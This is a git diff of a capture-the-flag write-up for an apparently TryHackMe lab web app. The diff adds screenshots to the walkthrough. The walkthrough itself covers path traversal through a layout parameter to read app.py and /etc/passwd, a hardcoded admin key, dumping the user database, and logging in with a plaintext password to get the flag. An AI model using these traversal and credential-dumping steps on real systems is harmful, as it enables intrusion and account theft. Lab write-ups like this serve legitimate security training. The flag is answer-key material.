@@ -50,6 +50,7 @@ Convention says the main file is `app.py`.
 ---
 
 ## Exploring the Application
+![description](/assets/images/cupid2.png)
 
 Before touching anything, Burp Suite was set up to intercept all traffic.
 Every click is potential data.
@@ -68,13 +69,12 @@ And one more that caught the eye immediately.
 ---
 
 ## Finding Cupid
+![description](/assets/images/cupid3.png)
 
 Browsing to `/profile/cupid`:
 
-```
-Username: cupid
-Bio: "I keep the database secure. No peeking."
-```
+![description](/assets/images/cupid4.png)
+
 
 Obviously if there was a sysadmin for Hearts and Bows Inc.,
 it would be no one other than this baby.
@@ -90,7 +90,7 @@ While interacting with profiles, the theme dropdown on each profile
 page was changed a few times and a Valentine was sent(maybe this year i might get lucky).
 
 Checking Burp's HTTP history revealed something interesting:
-
+![description](/assets/images/cupid5.png)
 ```
 GET /api/fetch_layout?layout=theme_romance.html
 GET /api/fetch_layout?layout=theme_classic.html
@@ -142,14 +142,7 @@ because the input isn't validated.
 
 ### Wrong paths first:
 
-```bash
-curl "http://10.81.157.215:5000/api/fetch_layout?layout=../app.py"
-```
-
-```
-Error: No such file or directory:
-'/opt/Valenfind/templates/components/../app.py'
-```
+![description](/assets/images/cupid6.png)
 
 The error message revealed the full server path:
 ```
@@ -168,7 +161,7 @@ Starting: /opt/Valenfind/templates/components/
 ../../     = /opt/Valenfind/           ← app.py lives here!
 ../../../  = /opt/
 ../../../../ = /                       ← filesystem root
-../../../../etc/passwd = /etc/passwd   ✅
+../../../../etc/passwd = /etc/passwd   ← password file
 ```
 
 ### Correct paths:
@@ -199,6 +192,8 @@ ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
 ```
 
 **Finding 2: Secret Admin Endpoint**
+![description](/assets/images/cupid7.png)
+
 ```python
 @app.route('/api/admin/export_db')
 def export_db():
@@ -240,6 +235,7 @@ sqlite3 valenfind_leak.db
 
 sqlite> SELECT username, password FROM users;
 ```
+![description](/assets/images/cupid8.png)
 
 There it was. Cupid's password. In plaintext.
 Just there waiting to be claimed.
@@ -258,6 +254,7 @@ Password: admin_root_x99
 Logged in. Navigated to the profile edit page (`/my_profile`).
 
 The address field read:
+![description](/assets/images/cupid1.png)
 
 ```
 FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
